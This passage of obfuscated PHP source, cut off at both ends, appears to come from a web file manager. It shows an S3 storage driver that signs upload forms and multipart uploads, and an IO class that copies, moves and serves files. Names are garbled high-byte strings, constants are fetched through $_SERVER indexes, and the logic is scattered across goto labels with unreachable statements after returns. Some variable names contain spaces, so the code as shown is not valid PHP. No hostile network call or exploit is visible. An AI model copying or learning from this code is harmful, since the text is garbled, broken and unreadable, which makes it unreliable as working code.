$this->fileOutLink($FŒù³ÛÂ÷ñ); } public function fileOutImageServer($eœèÛ‚óó, $Eå¢¶‹ïÍ = 250) { parent::fileOutImage($eœèÛ‚óó, $Eå¢¶‹ïÍ); } public function hashMd5($CÖ Å¶®ªƒ) { $a•…Ï×…½ =& $_SERVER[¢à]; $aÉ¢Ÿò§ª¿ = $this->objectMeta($CÖ Å¶®ªƒ); return isset($aÉ¢Ÿò§ª¿[$a•…Ï×…½[193]]) ? $aÉ¢Ÿò§ª¿[$a•…Ï×…½[193]] : !1; $CÀÃ¾°—¡İ = $this->link($CÖ Å¶®ªƒ, $a•…Ï×…½[1218]); } public function size($a†”¥¨ÉóÖ) { $aÙ×ÉÔ¹ëÁ = $this->objectMeta($a†”¥¨ÉóÖ); return $aÙ×ÉÔ¹ëÁ ? $aÙ×ÉÔ¹ëÁ[$_SERVER[¢à][77]] : 0; } public function info($e¡Ôİï˜ğ¶) { if ($this->isFolder($e¡Ôİï˜ğ¶)) { return $this->folderInfo($e¡Ôİï˜ğ¶); } else { if ($this->isFile($e¡Ôİï˜ğ¶)) { return $this->fileInfo($e¡Ôİï˜ğ¶); } } return !1; } public function exist($EÚ¶„†£Ğ°) { return $this->isFile($EÚ¶„†£Ğ°) || $this->isFolder($EÚ¶„†£Ğ°); } public function isFile($C›•“†ÂÁ–) { return !$this->isFolder($C›•“†ÂÁ–) && $this->objectMeta($C›•“†ÂÁ–); } public function isFolder($D“ÒŞÃ£Â„) { return $this->cacheMethod($_SERVER[¢à][220], $D“ÒŞÃ£Â„); } protected function objectMeta($d½”¶õïÂ) { return $this->cacheMethod($_SERVER[¢à][221], $d½”¶õïÂ); } protected function _objectMeta($c ä‚ò“”ó) { $Cô‘Àóâëà =& $_SERVER[¢à]; list($F³¥í“, $E„øˆ¤×ö) = $this->bucketManager->stat($this->bucket, $c ä‚ò“”ó); if ($F³¥í“) { $F³¥í“[$Cô‘Àóâëà[77]] = intval($F³¥í“[$Cô‘Àóâëà[1205]]); } return $F³¥í“; } protected function _isFolder($cßÈ·ó¶£¶) { $eŠª°±Ä®æ =& $_SERVER[¢à]; list($f‘ƒ’öâô®, $Bê‡ŠÒ³Î´) = $this->bucketManager->listFiles($this->bucket, trim($cßÈ·ó¶£¶, $eŠª°±Ä®æ[8]) . $eŠª°±Ä®æ[8], $eŠª°±Ä®æ[33], 1, $eŠª°±Ä®æ[8]); return !empty($f‘ƒ’öâô®[$eŠª°±Ä®æ[1204]]) || !empty($f‘ƒ’öâô®[$eŠª°±Ä®æ[1207]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($eŸ²À™´‡ˆ) { parent::__construct($eŸ²À™´‡ˆ); } public function uploadFormData($B•ÎÑÃË, $c•¬¶Úè• = 3600) { goto f¬Éš”ª…; BºÙ¿ÁÔÅ‚: $BŞ§óÃ¬ø‚ = $BÑºï°êãŒ[1125]; $C‰‘‰Â“¾ = $c•¬¶Úè• . $BÑºï°êãŒ[33]; $CÒù…¾ÂÇ = $BÑºï°êãŒ[1089]; goto eÒÜ‹ÆË¾; fœğ¦¼çÀÈ: $cªïÇ›¼Ğ‚ = $BÑºï°êãŒ[59]; $EµíÏ³ÃÜŸ = gmdate($BÑºï°êãŒ[1124]); $eÅ¯êãñµ = gmdate($BÑºï°êãŒ[690]); goto BºÙ¿ÁÔÅ‚; EÄ¨’ß¨: $cÓÜÎãÎŞ = base64_encode(json_encode($A¤¹ä¢“ŒŠ)); $AÛ¿¤†¦ŒÚ = hash_hmac($BÑºï°êãŒ[1133], $eÅ¯êãñµ, $BÑºï°êãŒ[1134] . $this->secret, !0); $fÈ¾éßğœˆ = hash_hmac($BÑºï°êãŒ[1133], $this->region, $AÛ¿¤†¦ŒÚ, !0); goto EÃ—·œÜ×Ë; eÒÜ‹ÆË¾: $AÇ¹éŠòµ = array($this->accessKey, $eÅ¯êãñµ, $this->region, $cªïÇ›¼Ğ‚, $BŞ§óÃ¬ø‚); $DÊíæ¢«—¥ = implode($BÑºï°êãŒ[8], $AÇ¹éŠòµ); $A¤¹ä¢“ŒŠ = array($BÑºï°êãŒ[1091] => gmdate($BÑºï°êãŒ[1090], strtotime($BÑºï°êãŒ[1126])), $BÑºï°êãŒ[1092] => array(array($BÑºï°êãŒ[1094] => $this->bucket), array($BÑºï°êãŒ[1093] => $Aƒæ¸‚Ó), array($BÑºï°êãŒ[1095], $BÑºï°êãŒ[1096], $BÑºï°êãŒ[33]), array($BÑºï°êãŒ[1095], $BÑºï°êãŒ[1127], $BÑºï°êãŒ[33]), array($BÑºï°êãŒ[1095], $BÑºï°êãŒ[1128], $BÑºï°êãŒ[33]), array($BÑºï°êãŒ[1097] => $CÒù…¾ÂÇ), array($BÑºï°êãŒ[1129] => $DÊíæ¢«—¥), array($BÑºï°êãŒ[1130] => $E”Æ’­ŸóÊ), array($BÑºï°êãŒ[1131] => $EµíÏ³ÃÜŸ), array($BÑºï°êãŒ[1132] => $C‰‘‰Â“¾))); goto EÄ¨’ß¨; D§èê°šÑê: $d¿é±‡¡ğ± = array($BÑºï°êãŒ[196] => $BÑºï°êãŒ[33], $BÑºï°êãŒ[1135] => $BÑºï°êãŒ[33], $BÑºï°êãŒ[1093] => $Aƒæ¸‚Ó, $BÑºï°êãŒ[1097] => $CÒù…¾ÂÇ, $BÑºï°êãŒ[1101] => $cÓÜÎãÎŞ, $BÑºï°êãŒ[1136] => $DÊíæ¢«—¥, $BÑºï°êãŒ[1137] => $E”Æ’­ŸóÊ, $BÑºï°êãŒ[1138] => $EµíÏ³ÃÜŸ, $BÑºï°êãŒ[1139] => $C‰‘‰Â“¾, $BÑºï°êãŒ[1140] => $Aù¿ÌºîÛ, $BÑºï°êãŒ[166] => $this->getHost()); return $d¿é±‡¡ğ±; goto fŒ‡ÈÕàà ; f¬Éš”ª…: $BÑºï°êãŒ =& $_SERVER[¢à]; $Aƒæ¸‚Ó = $BÑºï°êãŒ[182]; $E”Æ’­ŸóÊ = $BÑºï°êãŒ[1123]; goto fœğ¦¼çÀÈ; EÃ—·œÜ×Ë: $Eœ‹Š¥•†ß = hash_hmac($BÑºï°êãŒ[1133], $cªïÇ›¼Ğ‚, $fÈ¾éßğœˆ, !0); $B…³‚èÊ° = hash_hmac($BÑºï°êãŒ[1133], $BŞ§óÃ¬ø‚, $Eœ‹Š¥•†ß, !0); $Aù¿ÌºîÛ = hash_hmac($BÑºï°êãŒ[1133], $cÓÜÎãÎŞ, $B…³‚èÊ°); goto D§èê°šÑê; fŒ‡ÈÕàà : } public function multiUploadFormData($b«ÃìÂÃ‡à, $Dñ…´‰Œ£ = 3600) { $CßŠİ™â— =& $_SERVER[¢à]; $AÏë¬«ôŒÁ = gmdate($CßŠİ™â—[1219]); $A‹•…¬Ÿ¼‹ = array(); $FÁá’¬ƒ­ = $this->client->getUploadId($this->bucket, $b«ÃìÂÃ‡à, $A‹•…¬Ÿ¼‹); if (!$FÁá’¬ƒ­) { return !1; } return array($CßŠİ™â—[206] => $FÁá’¬ƒ­, $CßŠİ™â—[166] => $this->getHost() . $CßŠİ™â—[8] . $this->pathEncode($b«ÃìÂÃ‡à), $CßŠİ™â—[207] => $AÏë¬«ôŒÁ, $CßŠİ™â—[89] => $b«ÃìÂÃ‡à); } public function multiUploadAuthData($dŠÀî”°Ñ, $D¢îÖ¼´£ˆ = array()) { goto cÛƒŸß¯‘ƒ; Dß§²ï°…¾: unset($D¢îÖ¼´£ˆ[$dô±ñİ§Œ…[89]]); if (isset($D¢îÖ¼´£ˆ[$dô±ñİ§Œ…[208]])) { return $this->listUploadParts($bßˆÎŒİ™õ, $D¢îÖ¼´£ˆ); } $AšõÄ¾ßïÄ = array(); goto BÛÅà•¹…Ó; cÛƒŸß¯‘ƒ: $dô±ñİ§Œ… =& $_SERVER[¢à]; $BšÁÒŒÖá­ = isset($D¢îÖ¼´£ˆ[$dô±ñİ§Œ…[157]]) ? $D¢îÖ¼´£ˆ[$dô±ñİ§Œ…[157]] : $dô±ñİ§Œ…[33]; $bßˆÎŒİ™õ = $D¢îÖ¼´£ˆ[$dô±ñİ§Œ…[89]]; goto Dß§²ï°…¾; BÛÅà•¹…Ó: if (isset($D¢îÖ¼´£ˆ[$dô±ñİ§Œ…[1220]])) { $AšõÄ¾ßïÄ[$dô±ñİ§Œ…[1221]] = $D¢îÖ¼´£ˆ[$dô±ñİ§Œ…[1220]]; } $D°ï½ÏîŸ = explode($dô±ñİ§Œ…[168], $this->getHost()); $BËËâÛ„ã‘ = array($dô±ñİ§Œ…[1222] => $D°ï½ÏîŸ[1], $dô±ñİ§Œ…[1223] => $dô±ñİ§Œ…[33], $dô±ñİ§Œ…[196] => $dô±ñİ§Œ…[116], $dô±ñİ§Œ…[1135] => $D¢îÖ¼´£ˆ[$dô±ñİ§Œ…[77]]); goto DİŒÌÚ­; B¯ã­§‡¢’: if (strpos($BšÁÒŒÖá­, $dô±ñİ§Œ…[210]) === 0) { if (isset($AšõÄ¾ßïÄ[$dô±ñİ§Œ…[1221]])) { $EÓ‘øšøã› = $AšõÄ¾ßïÄ[$dô±ñİ§Œ…[1221]]; } else { if (isset($B Ù½˜¦ö[$dô±ñİ§Œ…[1221]])) { $EÓ‘øšøã› = $B Ù½˜¦ö[$dô±ñİ§Œ…[1221]]; } else { $EÓ‘øšøã› = hash($dô±ñİ§Œ…[1133], $dô±ñİ§Œ…[33]); } } return array($dô±ñİ§Œ…[217] => $B Ù½˜¦ö[$dô±ñİ§Œ…[217]], $dô±ñİ§Œ…[1221] => $EÓ‘øšøã›, $dô±ñİ§Œ…[207] => $B Ù½˜¦ö[$dô±ñİ§Œ…[1224]]); } return $B Ù½˜¦ö[$dô±ñİ§Œ…[217]]; goto eššˆ•ÛÔ; DİŒÌÚ­: $FÂëÌï¬øŠ = $dô±ñİ§Œ…[211]; $AáÖççìÆ = $dô±ñİ§Œ…[8] . $this->pathEncode($bßˆÎŒİ™õ) . $BšÁÒŒÖá­; $B Ù½˜¦ö = $this->client->__getSignatureV4($AšõÄ¾ßïÄ, $BËËâÛ„ã‘, $FÂëÌï¬øŠ, $AáÖççìÆ); goto B¯ã­§‡¢’; eššˆ•ÛÔ: } public function listUploadParts($A…‰ê£ì§£, $B­¶»šàğ = array()) { goto Fááºè­ùç; b×„†ÖÈ: if (!$Eš„–¸•¦) { return !1; } $bïÅ×÷æ¦î = $c«äˆ§½[1225]; foreach ($Eš„–¸•¦ as $dÒöç¸ÛÖÅ) { $bïÅ×÷æ¦î .= $c«äˆ§½[1226] . "\74\120\141\162\164\x4e\165\155\142\145\x72\x3e{$dÒöç¸ÛÖÅ[$c«äˆ§½[1177]]}\74\57\120\141\x72\x74\116\165\155\x62\145\162\x3e\12" . "\74\x45\x54\x61\147\x3e{$dÒöç¸ÛÖÅ[$c«äˆ§½[1178]]}\74\57\105\x54\141\x67\x3e\xa" . $c«äˆ§½[1227]; } goto eÔ ŸïÀ»; eÙà¦¬Š™: $bç¡Œ¿‰›å = $this->client->__getSignatureV4($D“•’îÕØ, $a­¡ƒÏÑ®, $D¶½“ÍŞ‚¹, $b£Ö•µËê, $bïÅ×÷æ¦î); return array($c«äˆ§½[217] => $bç¡Œ¿‰›å[$c«äˆ§½[217]], $c«äˆ§½[207] => $bç¡Œ¿‰›å[$c«äˆ§½[1224]], $c«äˆ§½[219] => $Eš„–¸•¦, $c«äˆ§½[1221] => $bç¡Œ¿‰›å[$c«äˆ§½[1221]]); goto CÚóˆŠÍ¸ò; eÔ ŸïÀ»: $bïÅ×÷æ¦î .= $c«äˆ§½[1228]; $D“•’îÕØ = array(); $B¬Ë¬ç²Šß = explode($c«äˆ§½[168], $this->getHost()); goto FöÊ¨çİŞ§; Fááºè­ùç: $c«äˆ§½ =& $_SERVER[¢à]; $e¢ôÂ¹ï»Ë = str_replace($c«äˆ§½[218], $c«äˆ§½[33], $B­¶»šàğ[$c«äˆ§½[157]]); $Eš„–¸•¦ = $this->client->listParts($this->bucket, $A…‰ê£ì§£, $e¢ôÂ¹ï»Ë); goto b×„†ÖÈ; FöÊ¨çİŞ§: $a­¡ƒÏÑ® = array($c«äˆ§½[1222] => $B¬Ë¬ç²Šß[1], $c«äˆ§½[196] => $c«äˆ§½[116], $c«äˆ§½[1135] => strlen($bïÅ×÷æ¦î)); $D¶½“ÍŞ‚¹ = $c«äˆ§½[209]; $b£Ö•µËê = $c«äˆ§½[8] . $this->pathEncode($A…‰ê£ì§£) . $B­¶»šàğ[$c«äˆ§½[157]]; goto eÙà¦¬Š™; CÚóˆŠÍ¸ò: } public function link($a×ºˆçù¥ß, $e†–ç¤ùÉö = array()) { return parent::link($a×ºˆçù¥ß, $e†–ç¤ùÉö); } public function fileOut($dë“­¾–¯², $cÁè ÓöÓ = false, $Aõ§Ì”ˆç¢ = false, $cÏî»÷äÛ‹ = '') { if (strstr($this->endpoint, $_SERVER[¢à][1229])) { return parent::fileOutServer($dë“­¾–¯², $cÁè ÓöÓ, $Aõ§Ì”ˆç¢, $cÏî»÷äÛ‹); } parent::fileOut($dë“­¾–¯², $cÁè ÓöÓ, $Aõ§Ì”ˆç¢, $cÏî»÷äÛ‹); } public function fileOutImage($B£Å‘«­¯, $fŒå­‡ñÆ = 250) { if (strstr($this->endpoint, $_SERVER[¢à][1229])) { return parent::fileOutImageServer($B£Å‘«­¯, $fŒå­‡ñÆ); } parent::fileOutImage($B£Å‘«­¯, $fŒå­‡ñÆ); } public function fileOutLink($F¤Ç¤Åæ¦Ã) { $bÜ ¿´ÉßŠ =& $_SERVER[¢à]; if (substr($F¤Ç¤Åæ¦Ã, 0, 7) == $bÜ ¿´ÉßŠ[1104]) { $F¤Ç¤Åæ¦Ã = $bÜ ¿´ÉßŠ[1105] . substr($F¤Ç¤Åæ¦Ã, 7); } header($bÜ ¿´ÉßŠ[153] . $F¤Ç¤Åæ¦Ã); die; } public function getHost() { $EÖĞ¦ĞèÑ =& $_SERVER[¢à]; $b½´ÉÂ¬ª = str_rtrim(parent::getHost(), $EÖĞ¦ĞèÑ[8] . $this->bucket); $b½´ÉÂ¬ª = explode($EÖĞ¦ĞèÑ[168], $b½´ÉÂ¬ª); return $b½´ÉÂ¬ª[0] . $EÖĞ¦ĞèÑ[168] . $this->bucket . $EÖĞ¦ĞèÑ[93] . $b½´ÉÂ¬ª[1]; } } goto E×§ŒÈŞ¿£; dé¯ÛËƒÁƒ: define($_SERVER[¢à][1905], 3); define($_SERVER[¢à][1906], 4); define($_SERVER[¢à][1907], 5); goto fŒËºƒ¬Ó…; d‡áäïô›: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($a®ƒ·Øùª‚, $e¡™Ê©™) { $c—½òã±šÛ = self::driverMake($e¡™Ê©™[0]); if (method_exists($c—½òã±šÛ, $a®ƒ·Øùª‚)) { return @call_user_func_array(array($c—½òã±šÛ, $a®ƒ·Øùª‚), $e¡™Ê©™); } if (method_exists($c—½òã±šÛ, $_SERVER[¢à][993])) { return @call_user_func_array(array($c—½òã±šÛ, $a®ƒ·Øùª‚), $e¡™Ê©™); } else { if (method_exists(self, $a®ƒ·Øùª‚)) { return @call_user_func_array(array(self, $a®ƒ·Øùª‚), $e¡™Ê©™); } else { call_user_func_array(array(parent, $a®ƒ·Øùª‚), $e¡™Ê©™); } } } public static function init($c‚¼ÄÆî¯Ş) { return self::driverMake($c‚¼ÄÆî¯Ş); } public static function copy($BÔ¯ÈÇ¼Ÿ, $Cø„çÓì›º, $e¾ğ‘µßÔØ = false, $fï¹¥Œåß = false) { return self::copyMove($BÔ¯ÈÇ¼Ÿ, $Cø„çÓì›º, $e¾ğ‘µßÔØ, $_SERVER[¢à][486], $fï¹¥Œåß); } public static function move($eï…Ÿáµ¢Š, $E­©ÛÁ•‘«, $a”¿ÇŒ¼Š = false, $D¥ã¢°¤ÒŸ = false) { return self::copyMove($eï…Ÿáµ¢Š, $E­©ÛÁ•‘«, $a”¿ÇŒ¼Š, $_SERVER[¢à][488], $D¥ã¢°¤ÒŸ); } public static function saveFile($Fì•Ó£, $e•¨ÅğÈ™ˆ, $C½æëßĞ † = true) { goto bÁ»—ºÌ»Û; BÚ‰ó‚È”ù: $f³œÍÔäè¢ = self::driverMake($e•¨ÅğÈ™ˆ); $DØÀ‹¡®»‹ = !1; if ($f³œÍÔäè¢->pathParse[$dö¾“´Éˆï[994]]) { $aÔÊµŠÅø— = $f³œÍÔäè¢->pathParse[$dö¾“´Éˆï[994]]; $DØÀ‹¡®»‹ = $f³œÍÔäè¢; $f³œÍÔäè¢ = self::driverMake($aÔÊµŠÅø—); } goto fäëœ© š; CÈƒÅÒ½°Ä: $Fïç‚Ô¥ŒÖ = self::copyFile($a‡Éà‰¾¼½, $Fì•Ó£, $f³œÍÔäè¢, $cîÄİ¶à¿¡, $DÁ©ù…·Ó‡[$dö¾“´Éˆï[28]], $A­ŞŸ¦é®¦); if ($DØÀ‹¡®»‹) { $Fïç‚Ô¥ŒÖ = $DØÀ‹¡®»‹->getPathOuter($Fïç‚Ô¥ŒÖ); } return $Fïç‚Ô¥ŒÖ; goto F÷éìé¸É; fäëœ© š: $cîÄİ¶à¿¡ = $f³œÍÔäè¢->pathFather($e•¨ÅğÈ™ˆ); $A­ŞŸ¦é®¦ = !0; if (!$C½æëßĞ † && self::driverIsSame($a‡Éà‰¾¼½, $f³œÍÔäè¢)) { $A­ŞŸ¦é®¦ = !1; } goto CÈƒÅÒ½°Ä; bÁ»—ºÌ»Û: $dö¾“´Éˆï =& $_SERVER[¢à]; $DÁ©ù…·Ó‡ = self::info($e•¨ÅğÈ™ˆ); $a‡Éà‰¾¼½ = self::driverMake($Fì•Ó£); goto BÚ‰ó‚È”ù; F÷éìé¸É: } private static function copyMove($E·ó«ÑÉ, $c«•½«ÚÚÈ, $e¬Ãôâ§µ, $F‘³ª÷÷¥, $D¨‰É†—¨ = false) { goto E‘á³ßãª¡; a¡–‚¼Ú³Ú: if ($fÀŞ¼çµìù) { $e¥ÉŞÒÔ² = $fÀŞ¼çµìù->getPathOuter($e¥ÉŞÒÔ²); } return $e¥ÉŞÒÔ²; goto eˆ¦Šöé£; EÈ‚êçˆ¨Õ: Hook::trigger($fƒÖÑÄöÙ¯[72], $B˜Ô˜„‰©å, $E·ó«ÑÉ, $E½ºœ¬ÛØ†, $c«•½«ÚÚÈ); $dóÒ×Óà¸“ = self::driverIsSame($B˜Ô˜„‰©å, $E½ºœ¬ÛØ†); if ($dóÒ×Óà¸“) { if ($F‘³ª÷÷¥ == $fƒÖÑÄöÙ¯[488] && trim($c«•½«ÚÚÈ, $fƒÖÑÄöÙ¯[8]) == trim($E½ºœ¬ÛØ†->pathFather($E·ó«ÑÉ), $fƒÖÑÄöÙ¯[8])) { return $E½ºœ¬ÛØ†->getPathOuter($E·ó«ÑÉ); } if (method_exists($E½ºœ¬ÛØ†, $F‘³ª÷÷¥)) { return $E½ºœ¬ÛØ†->{$F‘³ª÷÷¥}($E·ó«ÑÉ, $c«•½«ÚÚÈ, $e¬Ãôâ§µ); } } goto F¹«äÆÀªù; dàƒÚ©Œ¿Ğ: $fÀŞ¼çµìù = !1; if ($E½ºœ¬ÛØ†->pathParse[$fƒÖÑÄöÙ¯[994]]) { $c«•½«ÚÚÈ = $E½ºœ¬ÛØ†->pathParse[$fƒÖÑÄöÙ¯[994]]; $fÀŞ¼çµìù = $E½ºœ¬ÛØ†; $E½ºœ¬ÛØ† = self::driverMake($c«•½«ÚÚÈ); } self::check($B˜Ô˜„‰©å, $E·ó«ÑÉ, $E½ºœ¬ÛØ†, $c«•½«ÚÚÈ); goto EÈ‚êçˆ¨Õ; E‘á³ßãª¡: $fƒÖÑÄöÙ¯ =& $_SERVER[¢à]; if (!$E·ó«ÑÉ || $E·ó«ÑÉ == $fƒÖÑÄöÙ¯[8] || !$c«•½«ÚÚÈ) { return !1; } ignore_timeout(); goto EÇæ¹¤Ä†•; EÇæ¹¤Ä†•: $B˜Ô˜„‰©å = self::driverMake($E·ó«ÑÉ); $E½ºœ¬ÛØ† = self::driverMake($c«•½«ÚÚÈ); $cˆÜ¡ôµß‰ = $F‘³ª÷÷¥ == $fƒÖÑÄöÙ¯[488]; goto dàƒÚ©Œ¿Ğ; F¹«äÆÀªù: $dÇéÏöÆæ = $B˜Ô˜„‰©å->isFile($E·ó«ÑÉ); if (!$dÇéÏöÆæ && $E½ºœ¬ÛØ†->getType() == $fƒÖÑÄöÙ¯[694] && $B˜Ô˜„‰©å->getType() == $fƒÖÑÄöÙ¯[103]) { $e¥ÉŞÒÔ² = $E½ºœ¬ÛØ†->copyFolderFromIO($B˜Ô˜„‰©å, $E·ó«ÑÉ, $c«•½«ÚÚÈ, $e¬Ãôâ§µ, $cˆÜ¡ôµß‰, $D¨‰É†—¨); } else { $e¥ÉŞÒÔ² = self::copyPath($B˜Ô˜„‰©å, $E·ó«ÑÉ, $E½ºœ¬ÛØ†, $c«•½«ÚÚÈ, $e¬Ãôâ§µ, $cˆÜ¡ôµß‰, $dÇéÏöÆæ, $D¨‰É†—¨); } if ($e¥ÉŞÒÔ² && $cˆÜ¡ôµß‰) { $B˜Ô˜„‰©å->remove($E·ó«ÑÉ); } goto a¡–‚¼Ú³Ú; eˆ¦Šöé£: } private static function check($B‚©–Õî—‹, $AäÓå³§¿­, $e©‰Æ‰»ÚÖ, &$cÈÎ·˜Šª’) { $FÈŒ„¯èìÓ =& $_SERVER[¢à]; if (self::driverIsSame($B‚©–Õî—‹, $e©‰Æ‰»ÚÖ) && $B‚©–Õî—‹->isFolder($AäÓå³§¿­) && $B‚©–Õî—‹->isParentOf($AäÓå³§¿­, $cÈÎ·˜Šª’)) { show_json(LNG($FÈŒ„¯èìÓ[995]), !1); } if (!$B‚©–Õî—‹->exist($AäÓå³§¿­)) { show_json(LNG($FÈŒ„¯èìÓ[102]), !1); } } private static function copyPath($D‚¹½ê‚¯Ï, $CØà”ë¿ÖŒ, $AÕ¢«…‚Â, $e‚Üåµ‘¼, $fíôŠÙ°è—, $eÈ‡º¼—ê, $DÙï™—›²´, $C¬í…¸òÇÃ = false) { goto d¤Á‡œ·ğ; Dª¶ÉËˆœœ: if ($DÙï™—›²´) { return self::copyFile($D‚¹½ê‚¯Ï, $CØà”ë¿ÖŒ, $AÕ¢«…‚Â, $e‚Üåµ‘¼, $a†¶äğ¿…², $eÈ‡º¼—ê); } if ($fíôŠÙ°è— == REPEAT_RENAME_FOLDER) { $fíôŠÙ°è— = !1; } $eÕëÌè·°Ù = rtrim($e‚Üåµ‘¼, $EíäÆôÀ[8]) . $EíäÆôÀ[8] . $a†¶äğ¿…²; goto dÀÀôŸªÓ; dÀÀôŸªÓ: $a‘‘ÄåÒÏå = $AÕ¢«…‚Â->mkdir($AÕ¢«…‚Â->getPath($eÕëÌè·°Ù)); $e‚Üåµ‘¼ = $AÕ¢«…‚Â->getPathInner($a‘‘ÄåÒÏå); $fÜå„ù óæ = $D‚¹½ê‚¯Ï->listPath($CØà”ë¿ÖŒ, !0); goto C¿‹¹ØÂ‚ä; d¤Á‡œ·ğ: $EíäÆôÀ =& $_SERVER[¢à]; $a†¶äğ¿…² = $C¬í…¸òÇÃ ? $C¬í…¸òÇÃ : $D‚¹½ê‚¯Ï->getPathName($D‚¹½ê‚¯Ï->pathThis($CØà”ë¿ÖŒ)); if ($fíôŠÙ°è—) { $D¾ß¾Ì¸õ™ = $AÕ¢«…‚Â->fileNameExist($e‚Üåµ‘¼, $a†¶äğ¿…²); $a†¶äğ¿…² = $AÕ¢«…‚Â->fileNameAuto($e‚Üåµ‘¼, $a†¶äğ¿…², $fíôŠÙ°è—, !$DÙï™—›²´); $fíôŠÙ°è— = $D¾ß¾Ì¸õ™ ? $fíôŠÙ°è— : !1; } goto Dª¶ÉËˆœœ; C¿‹¹ØÂ‚ä: $câ×ï§Ğš = array_merge($fÜå„ù óæ[$EíäÆôÀ[73]], $fÜå„ù óæ[$EíäÆôÀ[74]]); foreach ($câ×ï§Ğš as $BÖ¡¶”ù·») { $E½¡‰®Øù­ = $BÖ¡¶”ù·»[$EíäÆôÀ[29]] == $EíäÆôÀ[164]; $CØà”ë¿ÖŒ = $D‚¹½ê‚¯Ï->getPathInner($BÖ¡¶”ù·»[$EíäÆôÀ[75]]); $AíˆÄ±ÂŠ = self::copyPath($D‚¹½ê‚¯Ï, $CØà”ë¿ÖŒ, $AÕ¢«…‚Â, $e‚Üåµ‘¼, $fíôŠÙ°è—, $eÈ‡º¼—ê, $E½¡‰®Øù­); if (!$AíˆÄ±ÂŠ) { write_log($EíäÆôÀ[996] . $CØà”ë¿ÖŒ . $EíäÆôÀ[997] . $e‚Üåµ‘¼, $EíäÆôÀ[998]); } } return $a‘‘ÄåÒÏå; goto Eâ–¼§É©”; Eâ–¼§É©”: } private static function copyFile($EƒÌ¾Õ‰, $F¡ÃØÏ²ŸË, $EØ»‘‡¾™¤, $Fñ¸„Íéß, $a²§ÈŠˆ’, $f²¤ÊÔ¤È¬) { goto A¡©¸ ¾Ñ§; c”øÂˆ„: Hook::trigger($cîœô‹œÊä[1000], $EƒÌ¾Õ‰, $F¡ÃØÏ²ŸË, $EØ»‘‡¾™¤, $Fñ¸„Íéß, $a²§ÈŠˆ’, $fÓÊ¬È); if (self::driverIsSame($EƒÌ¾Õ‰, $EØ»‘‡¾™¤)) { if ($f²¤ÊÔ¤È¬) { $c®Ê‰Â Ñ = $EØ»‘‡¾™¤->moveFile($F¡ÃØÏ²ŸË, $Fñ¸„Íéß); } else { $c®Ê‰Â Ñ = $EØ»‘‡¾™¤->copyFile($F¡ÃØÏ²ŸË, $Fñ¸„Íéß); } Hook::trigger($cîœô‹œÊä[1001], $EƒÌ¾Õ‰, $F¡ÃØÏ²ŸË, $EØ»‘‡¾™¤, $Fñ¸„Íéß, $a²§ÈŠˆ’, $c®Ê‰Â Ñ); return $c®Ê‰Â Ñ; } $f”ò æí‰ = TEMP_FILES; goto AŸÑÎ§‰Ù; aã‚Ëùáô‰: $dèùïÓ²Ú… = $EƒÌ¾Õ‰->iconvApp($dèùïÓ²Ú…); $c®Ê‰Â Ñ = $EØ»‘‡¾™¤->upload($Fñ¸„Íéß, $dèùïÓ²Ú…, $f²¤ÊÔ¤È¬); self::remove($f”ò æí‰ . $fÓÊ¬È); goto b”×Ù†³ª²; A¡©¸ ¾Ñ§: $cîœô‹œÊä =& $_SERVER[¢à]; $Fñ¸„Íéß = $EØ»‘‡¾™¤->getPath(rtrim($Fñ¸„Íéß, $cîœô‹œÊä[8]) . $cîœô‹œÊä[8] . $a²§ÈŠˆ’); $fÓÊ¬È = $cîœô‹œÊä[999] . time() . rand_string(5); goto c”øÂˆ„; AŸÑÎ§‰Ù: mk_dir($f”ò æí‰); $dèùïÓ²Ú… = $f”ò æí‰ . $fÓÊ¬È; $dèùïÓ²Ú… = $EƒÌ¾Õ‰->download($F¡ÃØÏ²ŸË, $dèùïÓ²Ú…); goto aã‚Ëùáô‰; b”×Ù†³ª²: Hook::trigger($cîœô‹œÊä[1001], $EƒÌ¾Õ‰, $F¡ÃØÏ²ŸË, $EØ»‘‡¾™¤, $Fñ¸„Íéß, $a²§ÈŠˆ’, $c®Ê‰Â Ñ); return $c®Ê‰Â Ñ; goto bá¯¦ÙÍÖ; bá¯¦ÙÍÖ: } public static function pathFather($A…¤ŠÍ¾ˆº) { $fä¼×ö´¡Á = IO::init($A…¤ŠÍ¾ˆº); $CÛØÁ®Ì¬¼ = $fä¼×ö´¡Á->pathFather($fä¼×ö´¡Á->path); return $fä¼×ö´¡Á->getPathOuter($CÛØÁ®Ì¬¼); } public static function fileOut($Aƒ¸¦¶ğÅ, $Aóß©šÅšõ = false, $aµùÆ°òö = false, $fËŸÅÊêÈ = '') { $EÂÊé¡¨Ì = self::driverMake($Aƒ¸¦¶ğÅ); if ($EÂÊé¡¨Ì->isFileOutServer()) { return $EÂÊé¡¨Ì->fileOutServer($Aƒ¸¦¶ğÅ, $Aóß©šÅšõ, $aµùÆ°òö, $fËŸÅÊêÈ); } return $EÂÊé¡¨Ì->fileOut($Aƒ¸¦¶ğÅ, $Aóß©šÅšõ, $aµùÆ°òö, $fËŸÅÊêÈ); } public static function fileOutImage($C­‘’îÍöÈ, $b‡Â¾‹»Î = 250) { $d¹„¸Œ…Š® = array(250, 600, 1200, 3000); for ($Dê ÔèÑßæ = 0; $Dê ÔèÑßæ < count($d¹„¸Œ…Š®); $Dê ÔèÑßæ++) { if ($Dê ÔèÑßæ == 0 && $b‡Â¾‹»Î <= $d¹„¸Œ…Š®[$Dê ÔèÑßæ]) { $b‡Â¾‹»Î = $d¹„¸Œ…Š®[$Dê ÔèÑßæ]; break; } else { if ($b‡Â¾‹»Î > $d¹„¸Œ…Š®[$Dê ÔèÑßæ - 1] && $b‡Â¾‹»Î <= $d¹„¸Œ…Š®[$Dê ÔèÑßæ]) { $b‡Â¾‹»Î = $d¹„¸Œ…Š®[$Dê ÔèÑßæ]; break; } else { if ($Dê ÔèÑßæ == count($d¹„¸Œ…Š®) - 1 && $b‡Â¾‹»Î > $d¹„¸Œ…Š®[$Dê ÔèÑßæ]) { $b‡Â¾‹»Î = $d¹„¸Œ…Š®[$Dê ÔèÑßæ]; break; } } } } $dğŠØ»…‚Û = self::driverMake($C­‘’îÍöÈ); if ($dğŠØ»…‚Û->isFileOutServer()) { return $dğŠØ»…‚Û->fileOutImageServer($C­‘’îÍöÈ, $b‡Â¾‹»Î); } return $dğŠØ»…‚Û->fileOutImage($C­‘’îÍöÈ, $b‡Â¾‹»Î); } private static function driverIsSame($a®ÒÄÁ×ó, $BØçê‡ƒÄ) { goto b‘àˆöô®‚; C×İœ†½µì: 